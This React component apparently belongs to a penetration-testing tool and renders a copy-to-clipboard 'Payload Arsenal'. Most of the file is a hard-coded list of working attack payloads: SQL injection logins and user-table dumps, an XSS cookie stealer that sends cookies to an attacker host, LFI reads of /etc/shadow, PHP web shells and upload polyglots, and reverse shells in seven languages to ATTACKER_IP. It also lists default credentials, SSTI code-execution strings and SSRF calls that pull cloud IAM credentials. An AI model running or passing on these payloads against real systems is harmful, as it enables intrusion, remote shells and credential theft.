'use client'

import React, { useState } from 'react'
import { Copy, CheckCircle2, Search, Zap, Globe, Shield, Terminal, Key, Database, ChevronDown, ChevronRight, AlertTriangle } from 'lucide-react'
import { cn } from '@/lib/utils'

interface Payload {
  label: string
  value: string
  note?: string
}

interface PayloadSection {
  id: string
  title: string
  subtitle: string
  icon: React.ElementType
  color: string
  borderColor: string
  payloads: Payload[]
}

const SECTIONS: PayloadSection[] = [
  {
    id: 'sqli',
    title: 'SQL Injection',
    subtitle: 'Auth bypass, UNION, blind, time-based, error-based',
    icon: Database,
    color: 'text-red-400',
    borderColor: 'border-red-500/25',
    payloads: [
      { label: 'Auth Bypass (Classic)', value: `' OR 1=1--`, note: 'Most basic — try in username AND password fields' },
      { label: 'Auth Bypass (Double Quote)', value: `" OR "1"="1`, note: 'For double-quote context' },
      { label: 'Auth Bypass (Admin)', value: `admin'--`, note: 'Comment out password check entirely' },
      { label: 'Auth Bypass (Hash)', value: `admin'/*`, note: 'MySQL block comment variant' },
      { label: 'UNION Column Count', value: `' ORDER BY 1--`, note: 'Increment until error → that is column count' },
      { label: 'UNION SELECT (3 cols)', value: `' UNION SELECT NULL,NULL,NULL--`, note: 'Replace NULLs with 1,2,3 to find output position' },
      { label: 'UNION DB Version', value: `' UNION SELECT NULL,version(),NULL--`, note: 'MySQL: @@version | MSSQL: @@VERSION' },
      { label: 'UNION DB Name', value: `' UNION SELECT NULL,database(),NULL--`, note: 'Current database name' },
      { label: 'UNION All Tables', value: `' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--`, note: 'Enumerate all tables' },
      { label: 'UNION All Columns', value: `' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--` },
      { label: 'UNION Dump Users', value: `' UNION SELECT NULL,concat(username,':',password),NULL FROM users--` },
      { label: 'Time-Based Blind (MySQL)', value: `' AND SLEEP(5)--`, note: '5 second delay = vulnerable' },
      { label: 'Time-Based Blind (MSSQL)', value: `'; WAITFOR DELAY '0:0:5'--` },
      { label: 'Error-Based (MySQL)', value: `' AND extractvalue(1,concat(0x7e,(select version())))--` },
      { label: 'Stacked Queries (MSSQL)', value: `'; EXEC xp_cmdshell('whoami')--`, note: 'RCE via SQL if xp_cmdshell enabled' },
      { label: 'SQLite Tables', value: `' UNION SELECT NULL,tbl_name,NULL FROM sqlite_master--` },
      { label: 'NoSQL Bypass (MongoDB)', value: `{"username": {"$ne": null}, "password": {"$ne": null}}`, note: 'In JSON body — $ne = not equal' },
    ]
  },
  {
    id: 'xss',
    title: 'XSS Payloads',
    subtitle: 'Reflected, stored, DOM, WAF bypass, event handlers',
    icon: Globe,
    color: 'text-orange-400',
    borderColor: 'border-orange-500/25',
    payloads: [
      { label: 'Basic Alert', value: `<script>alert(1)</script>` },
      { label: 'Img Onerror', value: `<img src=x onerror=alert(1)>`, note: 'Works when script tags are filtered' },
      { label: 'SVG Onload', value: `<svg onload=alert(1)>` },
      { label: 'Body Onload', value: `<body onload=alert(1)>` },
      { label: 'Input Autofocus', value: `<input autofocus onfocus=alert(1)>` },
      { label: 'Details Open', value: `<details open ontoggle=alert(1)>` },
      { label: 'JavaScript URI', value: `javascript:alert(1)`, note: 'For href= or src= injection contexts' },
      { label: 'WAF Bypass (Case)', value: `<ScRiPt>alert(1)</sCrIpT>` },
      { label: 'WAF Bypass (Encoded)', value: `<script>alert\u0028document.cookie\u0029</script>`, note: 'Unicode encoding' },
      { label: 'WAF Bypass (No Space)', value: `<svg/onload=alert(1)>` },
      { label: 'Attribute Breakout', value: `" onmouseover="alert(1)`, note: 'Close the current attribute, inject event' },
      { label: 'Cookie Stealer', value: `<script>fetch('http://ATTACKER/steal?c='+document.cookie)</script>`, note: 'Replace ATTACKER with your listener IP' },
      { label: 'DOM XSS (hash)', value: `#"><img src=x onerror=alert(1)>`, note: 'For URL fragment sinks like location.hash' },
      { label: 'Template Literal', value: '`${alert(1)}`', note: 'Inside template literal eval contexts' },
    ]
  },
  {
    id: 'lfi',
    title: 'LFI / Path Traversal',
    subtitle: 'File inclusion, directory traversal, log poisoning',
    icon: Search,
    color: 'text-yellow-400',
    borderColor: 'border-yellow-500/25',
    payloads: [
      { label: '/etc/passwd', value: `../../../../etc/passwd` },
      { label: '/etc/passwd (deep)', value: `../../../../../../../../../../etc/passwd` },
      { label: '/etc/shadow (privesc)', value: `../../../../etc/shadow`, note: 'Needs root read permissions' },
      { label: '/proc/self/environ', value: `../../../../proc/self/environ`, note: 'Contains env vars + User-Agent (log poisoning)' },
      { label: '/proc/self/cmdline', value: `../../../../proc/self/cmdline`, note: 'Shows the process command line' },
      { label: 'Apache Access Log', value: `../../../../var/log/apache2/access.log`, note: 'Log poisoning target' },
      { label: 'Nginx Access Log', value: `../../../../var/log/nginx/access.log` },
      { label: 'SSH Auth Log', value: `../../../../var/log/auth.log`, note: 'Poison via SSH username' },
      { label: 'Null Byte Bypass', value: `../../../../etc/passwd%00`, note: 'Older PHP — truncates at null byte' },
      { label: 'Double Encode', value: `..%252f..%252f..%252fetc/passwd`, note: 'Double URL encode the slash' },
      { label: 'PHP Wrapper (base64)', value: `php://filter/convert.base64-encode/resource=index.php`, note: 'Read PHP source code as base64' },
      { label: 'PHP Data Wrapper', value: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`, note: 'Executes: <?php system($_GET[\'cmd\']); ?>' },
      { label: 'PHP Input Wrapper', value: `php://input`, note: 'Pair with POST body containing PHP code' },
      { label: 'Windows System32', value: `..\\..\\..\\windows\\system32\\drivers\\etc\\hosts`, note: 'Windows LFI path separator' },
    ]
  },
  {
    id: 'shells',
    title: 'Reverse Shells',
    subtitle: 'Bash, Python, PHP, Netcat, PowerShell one-liners',
    icon: Terminal,
    color: 'text-emerald-400',
    borderColor: 'border-emerald-500/25',
    payloads: [
      { label: 'Bash TCP', value: `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`, note: 'Replace ATTACKER_IP and PORT' },
      { label: 'Bash UDP', value: `bash -i >& /dev/udp/ATTACKER_IP/4444 0>&1` },
      { label: 'Python3 TCP', value: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'` },
      { label: 'Python2 TCP', value: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
      { label: 'PHP System', value: `<?php system($_GET['cmd']); ?>`, note: 'Upload then use ?cmd=whoami' },
      { label: 'PHP Shell (Exec)', value: `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>` },
      { label: 'Netcat (with -e)', value: `nc ATTACKER_IP 4444 -e /bin/bash`, note: 'Traditional netcat with -e flag' },
      { label: 'Netcat (no -e)', value: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f`, note: 'OpenBSD netcat without -e' },
      { label: 'PowerShell (Base64)', value: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` },
      { label: 'Ruby TCP', value: `ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
      { label: 'Perl TCP', value: `perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
      { label: 'Listener (nc)', value: `nc -nlvp 4444`, note: 'Run this on your machine FIRST' },
      { label: 'Upgrade to PTY', value: `python3 -c 'import pty;pty.spawn("/bin/bash")' && export TERM=xterm`, note: 'After shell — get proper interactive TTY' },
      { label: 'Stable Shell (stty)', value: `Ctrl+Z  →  stty raw -echo; fg  →  reset`, note: 'Full terminal control: arrows, tab, Ctrl+C' },
    ]
  },
  {
    id: 'creds',
    title: 'Default Credentials',
    subtitle: 'Common username:password pairs by service',
    icon: Key,
    color: 'text-cyan-400',
    borderColor: 'border-cyan-500/25',
    payloads: [
      { label: 'Web Apps (Universal)', value: `admin:admin | admin:password | admin:admin123 | root:root` },
      { label: 'MySQL', value: `root:(empty) | root:root | root:mysql` },
      { label: 'PostgreSQL', value: `postgres:postgres | postgres:(empty)` },
      { label: 'MongoDB', value: `admin:(empty) — no auth by default (older versions)` },
      { label: 'Redis', value: `(no username) — no auth by default` },
      { label: 'FTP Anonymous', value: `anonymous:anonymous | anonymous:(empty)` },
      { label: 'SSH', value: `root:root | root:toor | pi:raspberry (Raspberry Pi)` },
      { label: 'WordPress', value: `admin:admin | admin:password | admin:(site_name)` },
      { label: 'Tomcat', value: `tomcat:tomcat | admin:admin | manager:manager` },
      { label: 'Jenkins', value: `admin:admin | admin:(blank) — check /var/jenkins_home/secrets/initialAdminPassword` },
      { label: 'Kibana / Elastic', value: `elastic:changeme | elastic:(blank)` },
      { label: 'Router Defaults', value: `admin:admin | admin:password | admin:1234 | admin:(blank)` },
      { label: 'Grafana', value: `admin:admin (forced change on first login)` },
      { label: 'RabbitMQ', value: `guest:guest` },
      { label: 'Jupyter Notebook', value: `(blank password) — check for token in startup logs` },
    ]
  },
  {
    id: 'upload',
    title: 'File Upload Bypass',
    subtitle: 'Extension tricks, MIME spoofing, magic bytes, polyglots',
    icon: Zap,
    color: 'text-violet-400',
    borderColor: 'border-violet-500/25',
    payloads: [
      { label: 'PHP Extension Variants', value: `.php5 | .phtml | .pHp | .PHP | .pHpP | .php.jpg` },
      { label: 'ASP Extension Variants', value: `.asp | .aspx | .ashx | .cer | .asa` },
      { label: 'Double Extension', value: `shell.php.jpg`, note: 'Relies on server only checking last extension' },
      { label: 'Null Byte (old PHP)', value: `shell.php%00.jpg`, note: 'Server sees .jpg, PHP executes .php' },
      { label: 'MIME Spoof (Content-Type)', value: `Content-Type: image/jpeg`, note: 'Change in Burp/proxy while uploading .php file' },
      { label: 'GIF Magic Bytes', value: `GIF89a;<?php system($_GET['cmd']); ?>`, note: 'Prepend GIF header to PHP code' },
      { label: 'JPEG Polyglot', value: `\xFF\xD8\xFF<?php system($_GET['cmd']); ?>`, note: 'JPEG magic bytes + PHP payload' },
      { label: 'SVG XSS Upload', value: `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`, note: 'Upload as .svg for stored XSS' },
      { label: 'Check EXIF Comment', value: `exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg`, note: 'Inject PHP into EXIF metadata' },
      { label: 'IIS Short Name', value: `shell.asp;.jpg`, note: 'IIS parses as .asp before the semicolon' },
    ]
  },
  {
    id: 'misc',
    title: 'SSTI / SSRF / XXE',
    subtitle: 'Template injection probes, server-side request forgery, XML entity attacks',
    icon: Shield,
    color: 'text-pink-400',
    borderColor: 'border-pink-500/25',
    payloads: [
      { label: 'SSTI Detection', value: `{{7*7}} | ${7*7} | #{7*7} | <%= 7*7 %>`, note: 'If output is 49 → template injection exists' },
      { label: 'SSTI Jinja2 RCE', value: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`, note: 'Python/Flask Jinja2' },
      { label: 'SSTI Twig RCE', value: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`, note: 'PHP Twig' },
      { label: 'SSTI Freemarker RCE', value: '<#assign ex="freemarker.template.utility.Execute"?new()>' + '${ex("id")}', note: 'Java Freemarker' },
      { label: 'SSRF AWS Metadata', value: `http://169.254.169.254/latest/meta-data/`, note: 'AWS IMDSv1 — get IAM credentials' },
      { label: 'SSRF GCP Metadata', value: `http://metadata.google.internal/computeMetadata/v1/`, note: 'Needs header: Metadata-Flavor: Google' },
      { label: 'SSRF Localhost', value: `http://127.0.0.1:PORT/admin`, note: 'Access internal services via SSRF' },
      { label: 'XXE Basic', value: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`, note: 'Classic file read via XXE' },
      { label: 'XXE SSRF', value: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_IP/test">]><root>&xxe;</root>` },
      { label: 'Open Redirect', value: `/redirect?url=https://evil.com | /?next=//evil.com | /?redirect=\\/\\evil.com`, note: 'Test common parameter names' },
      { label: 'CRLF Injection', value: `%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK`, note: 'HTTP response splitting' },
      { label: 'Host Header Injection', value: `Host: evil.com`, note: 'Modify Host header → password reset poisoning' },
    ]
  },
]

interface PayloadArsenalProps {
  target?: string
}

export function PayloadArsenal({ target }: PayloadArsenalProps) {
  const [expandedSection, setExpandedSection] = useState<string>('')
  const [searchQuery, setSearchQuery] = useState('')
  const [copied, setCopied] = useState<string | null>(null)

  const copyPayload = (val: string) => {
    navigator.clipboard.writeText(val)
    setCopied(val)
    setTimeout(() => setCopied(null), 2000)
  }

  const filtered = SECTIONS.map(s => ({
    ...s,
    payloads: s.payloads.filter(p =>
      !searchQuery ||
      p.label.toLowerCase().includes(searchQuery.toLowerCase()) ||
      p.value.toLowerCase().includes(searchQuery.toLowerCase()) ||
      (p.note || '').toLowerCase().includes(searchQuery.toLowerCase())
    )
  })).filter(s => !searchQuery || s.payloads.length > 0)

  return (
    <div className="w-full h-full bg-[#0a0a0c] flex flex-col overflow-hidden">
      {/* Header */}
      <div className="sticky top-0 z-10 bg-[#0a0a0c]/95 backdrop-blur border-b border-border/40 px-6 py-4 shrink-0 flex items-center gap-4">
        <div className="p-2 rounded-lg bg-destructive/10 border border-destructive/20">
          <Zap className="size-4 text-destructive" />
        </div>
        <div>
          <h2 className="text-sm font-black font-mono tracking-widest uppercase text-foreground">PAYLOAD ARSENAL</h2>
          <p className="text-[9px] font-mono text-muted-foreground uppercase tracking-wider opacity-60">
            Offline payload reference · Click any entry to copy to clipboard
          </p>
        </div>
        {/* Search */}
        <div className="relative ml-auto">
          <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 size-3 text-muted-foreground/50 pointer-events-none" />
          <input
            type="text"
            value={searchQuery}
            onChange={e => setSearchQuery(e.target.value)}
            placeholder="SEARCH PAYLOADS..."
            className="pl-7 pr-4 py-1.5 bg-muted/10 border border-border/50 rounded font-mono text-[9px] uppercase placeholder:opacity-30 text-foreground focus:border-primary/40 focus:outline-none w-56"
          />
        </div>
      </div>

      {/* Content */}
      <div className="flex-1 overflow-y-auto custom-scrollbar p-4 space-y-2">
        {filtered.map(section => {
          const Icon = section.icon
          const isExpanded = expandedSection === section.id || !!searchQuery
          return (
            <div key={section.id} className={cn("rounded-xl border overflow-hidden transition-all", section.borderColor, isExpanded && !searchQuery ? 'bg-card/10' : 'border-border/30 bg-card/5')}>
              {/* Section Header */}
              <button
                onClick={() => setExpandedSection(isExpanded && !searchQuery ? '' : section.id)}
                className="w-full flex items-center gap-3 px-5 py-4 hover:bg-white/[0.02] transition-colors text-left"
              >
                <div className={cn("p-2 rounded-lg border", isExpanded && !searchQuery ? section.borderColor : 'border-border/30 bg-muted/10')}>
                  <Icon className={cn("size-4.5", isExpanded && !searchQuery ? section.color : 'text-muted-foreground')} />
                </div>
                <div className="flex-1 min-w-0">
                  <div className={cn("font-mono text-xs sm:text-[13px] font-black uppercase tracking-widest", isExpanded && !searchQuery ? section.color : 'text-muted-foreground')}>
                    {section.title}
                  </div>
                  <div className="font-mono text-[9px] sm:text-[10px] text-muted-foreground/50 uppercase tracking-wider mt-0.5 truncate">
                    {section.subtitle}
                  </div>
                </div>
                <span className="font-mono text-[9px] sm:text-[10px] text-muted-foreground/40 uppercase tracking-wider">
                  {section.payloads.length} PAYLOADS
                </span>
                {!searchQuery && (isExpanded
                  ? <ChevronDown className={cn("size-4.5", section.color)} />
                  : <ChevronRight className="size-4.5 text-muted-foreground/40" />
                )}
              </button>

              {/* Payloads */}
              {(isExpanded || !!searchQuery) && section.payloads.length > 0 && (
                <div className="border-t border-border/20 divide-y divide-border/10">
                  {section.payloads.map((payload, i) => (
                    <button
                      key={i}
                      onClick={() => copyPayload(payload.value)}
                      className="w-full flex items-start gap-3 px-5 py-4 hover:bg-muted/5 transition-colors text-left group"
                    >
                      <div className="flex-1 min-w-0 space-y-1.5">
                        <div className="flex items-center gap-2">
                          <span className="font-mono text-xs sm:text-[12px] font-extrabold text-foreground/90">{payload.label}</span>
                        </div>
                        <code className="block text-xs sm:text-[12px] font-mono text-primary/80 break-all leading-relaxed bg-[#0c0d12]/90 border border-border/10 p-2.5 rounded-md mt-1 select-all">
                          {payload.value}
                        </code>
                        {payload.note && (
                          <p className="text-[10px] font-mono text-muted-foreground/45 uppercase tracking-wide mt-1">
                            ↳ {payload.note}
                          </p>
                        )}
                      </div>
                      <div className="shrink-0 pt-1 opacity-0 group-hover:opacity-100 transition-opacity">
                        {copied === payload.value
                          ? <CheckCircle2 className="size-4.5 text-emerald-400" />
                          : <Copy className="size-4.5 text-muted-foreground" />
                        }
                      </div>
                    </button>
                  ))}
                </div>
              )}
            </div>
          )
        })}
      </div>

      {/* Footer */}
      <div className="sticky bottom-0 bg-[#0a0a0c]/95 backdrop-blur border-t border-border/30 px-6 py-3 flex items-center gap-2 shrink-0">
        <AlertTriangle className="size-3 text-amber-400/40" />
        <span className="font-mono text-[8px] text-muted-foreground/35 uppercase tracking-widest">
          For authorized engagements only · Click any payload to copy · All operations are logged
        </span>
      </div>
    </div>
  )
}
